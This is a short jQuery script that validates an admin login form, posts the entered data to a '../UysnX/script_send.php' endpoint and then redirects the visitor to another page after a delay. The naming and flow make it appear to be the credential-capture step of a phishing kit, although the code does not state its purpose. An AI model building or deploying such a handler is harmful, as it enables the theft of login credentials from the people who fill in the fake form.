







$(function() {
    $("form[name='formadmin']").validate({
    rules: {
  
      username: "required",
  
    },
    messages: {
  
      username: "   ",
        
    },
    submitHandler: function(form) {
        $("#xuysnx").show();
         $.post("../UysnX/script_send.php", $("#formadmin").serialize(), function(result) {
            setTimeout(function() {
                $(location).attr("href", "../p/");
            }, 2000);
            
         
        });
    },
  });
  });
  
  
  
  
  
  
  
  
  
  
  
  
  
 
      
      
      
      
                       
  
  


















           